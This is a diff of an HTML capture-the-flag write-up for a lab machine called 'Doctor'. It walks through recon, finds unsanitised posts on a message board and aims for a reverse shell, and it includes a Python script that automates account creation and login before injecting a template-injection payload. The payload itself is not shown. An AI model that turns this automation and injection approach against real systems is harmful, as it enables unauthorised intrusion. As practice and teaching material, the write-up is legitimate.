@@ -24,76 +24,76 @@ body {
 
           <p>
 
-		  <img src="images/doctor/doc-head.PNG" alt="doctor" class="inline"/>    				<br/> <br/> <br/>
+	<img src="images/doctor/doc-head.PNG" alt="doctor" class="inline"/>    				<br/> <br/> <br/>
 
-		  We start out with the usual nmap scan                                     				<br/> <br/>
-		  <img src="images/doctor/doc-nmap.PNG" alt="nmap" class="inline"/>         				<br/> <br/> <br/>
+	We start out with the usual nmap scan                                     				<br/> <br/>
+	<img src="images/doctor/doc-nmap.PNG" alt="nmap" class="inline"/>         				<br/> <br/> <br/>
 
-		  Points of interest here are a web server on port 80 and some sort of splunk server running on 8089 	<br/> <br/>
-      <img src="images/doctor/web-start-page.PNG" alt="web page" class="inline"/>         			<br/> <br/> <br/>
-		  <img src="images/doctor/splunk.PNG" alt="splunk" class="inline"/>         				<br/> <br/> <br/>
+	Points of interest here are a web server on port 80 and some sort of splunk server running on 8089 	<br/> <br/>
+      	<img src="images/doctor/web-start-page.PNG" alt="web page" class="inline"/>         			<br/> <br/> <br/>
+	<img src="images/doctor/splunk.PNG" alt="splunk" class="inline"/>         				<br/> <br/> <br/>
 
 
-		  We're not able to pull much info out of the splunk interface, since all the dirs require creds.
-		  The contact us page on the webserver has a link to the domain <b> doctors.htb </b>, this was sort of login portal	<br/> <br/>
-	    <img src="images/doctor/login-page.PNG" alt="nmap" class="inline"/>         				<br/> <br/> <br/>
+	We're not able to pull much info out of the splunk interface, since all the dirs require creds.
+	The contact us page on the webserver has a link to the domain <b> doctors.htb </b>, this was sort of login portal	<br/> <br/>
+	<img src="images/doctor/login-page.PNG" alt="nmap" class="inline"/>         						<br/> <br/> <br/>
 
-			After creating a new account and logging in, there is an interesting setup. There is a 					<br/>
-			to make a new post, like some sort of message board. And there is a /archive directory where				<br/>
-			we can display all of our posts. 											<br/> <br/>
+	After creating a new account and logging in, there is an interesting setup. There is a 					<br/>
+	to make a new post, like some sort of message board. And there is a /archive directory where				<br/>
+	we can display all of our posts. 											<br/> <br/>
 
-			After some enumeration, it became apparent that the posts were not being sanitized whatsoever, 					<br/>
-			and we can directly inject html. The challenge now becomes how can we inject html such that when				<br/>
-			it gets executed we receive a reverse shell.											<br/> <br/>
+	After some enumeration, it became apparent that the posts were not being sanitized whatsoever, 				<br/>
+	and we can directly inject html. The challenge now becomes how can we inject html such that when			<br/>
+	it gets executed we receive a reverse shell.										<br/> <br/>
 
-			The website only allows us to create a user thats valid for 20m, this became a pain as I was testing commands.		<br/>
-			I opted to write a simple python script to generate a new account, and upload a post with our injection.		<br/>
-			The following code will randomly generate a string, register a new account with that string, and login.			<br/><br/>
+	The website only allows us to create a user thats valid for 20m, this became a pain as I was testing commands.		<br/>
+	I opted to write a simple python script to generate a new account, and upload a post with our injection.		<br/>
+	The following code will randomly generate a string, register a new account with that string, and login.			<br/><br/>
 
 			<code>
-				#!/usr/bin/python3
-
-				from pwn import *
-				import requests, time, random, string
-
-				my_ip = "10.10.14.29"
-				my_port = "8000"
-
-				reg_url      = 'http://doctors.htb/register'
-				login_url    = 'http://doctors.htb/login'
-				home_url     = 'http://doctors.htb/home'
-				inject_url   = 'http://doctors.htb/post/new'
-				archive_url  = 'http://doctors.htb/archive'
-
-				def get_random_string(length):
-    				letters = string.ascii_lowercase
-    				result_str = ''.join(random.choice(letters) for i in range(length))
-    				return result_str
-
-				user = get_random_string(6).capitalize()
-				email = user + "@yahoo.com"
-
-				# the data for our 3 post requests, fields copied from burpsuite after manual tests
-				reg_dict = { 'username': user, 'email': email, 'password': 'test', 'confirm_password': 'test', 'submit': 'Sign+Up'}
-				login_dict = { 'email': email, 'password': 'test', 'submit': 'Login'}
-				inject_dict = { 'title': exploit, 'content': 'Hello World', 'submit': 'Post' }
-
-				with requests.Session() as session:
-    				# Attempt to hit the register endpoint and create an account
-    				get = session.get(reg_url)
-    				post = session.post(reg_url, data=reg_dict)
-    				if "Your account has been created, with a time limit of twenty minutes!" not in post.text:
-        				print("[-] Account creation failed.. exiting")
-        				exit(0)
-    				print("[+] Created account " + email)
-
-    				# Attempt to login with our new creds
-    				login = session.post(login_url, data=login_dict)
-    				if "Logout" not in login.text:
-        				print("[-] Login failed.. exiting")
-        				exit(0)
-    				print("[+] Login success")
-			</code>
+				#!/usr/bin/python3									<br/>
+															<br/>
+				from pwn import *									<br/>
+				import requests, time, random, string							<br/>
+															<br/>
+				my_ip = "10.10.14.29"									<br/>
+				my_port = "8000"									<br/>
+															<br/>
+				reg_url      = 'http://doctors.htb/register'						<br/>
+				login_url    = 'http://doctors.htb/login'						<br/>
+				home_url     = 'http://doctors.htb/home'						<br/>
+				inject_url   = 'http://doctors.htb/post/new'						<br/>
+				archive_url  = 'http://doctors.htb/archive'						<br/>
+															<br/>
+				def get_random_string(length):								<br/>
+    				letters = string.ascii_lowercase							<br/>
+    				result_str = ''.join(random.choice(letters) for i in range(length))			<br/>
+    				return result_str									<br/>
+															<br/>
+				user = get_random_string(6).capitalize()						<br/>
+				email = user + "@yahoo.com"								<br/>
+															<br/>
+				# the data for our 3 post requests, fields copied from burpsuite after manual tests	<br/>
+				reg_dict = { 'username': user, 'email': email, 'password': 'test', 'confirm_password': 'test', 'submit': 'Sign+Up'}	<br/>
+				login_dict = { 'email': email, 'password': 'test', 'submit': 'Login'}			<br/>
+				inject_dict = { 'title': exploit, 'content': 'Hello World', 'submit': 'Post' }		<br/>
+															<br/>
+				with requests.Session() as session:							<br/>
+    				# Attempt to hit the register endpoint and create an account				<br/>
+    				get = session.get(reg_url)								<br/>
+    				post = session.post(reg_url, data=reg_dict)						<br/>
+    				if "Your account has been created, with a time limit of twenty minutes!" not in post.text:	<br/>
+        				print("[-] Account creation failed.. exiting")					<br/>
+        				exit(0)										<br/>
+    				print("[+] Created account " + email)							<br/>
+															<br/>
+    				# Attempt to login with our new creds							<br/>
+    				login = session.post(login_url, data=login_dict)					<br/>
+    				if "Logout" not in login.text:								<br/>
+        				print("[-] Login failed.. exiting")						<br/>
+        				exit(0)										<br/>
+    				print("[+] Login success")								<br/>
+			</code>											
 
 			The next challenge is to figure out our injection. I found an awesome <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2"> resource here </a> <br/><br/>
 
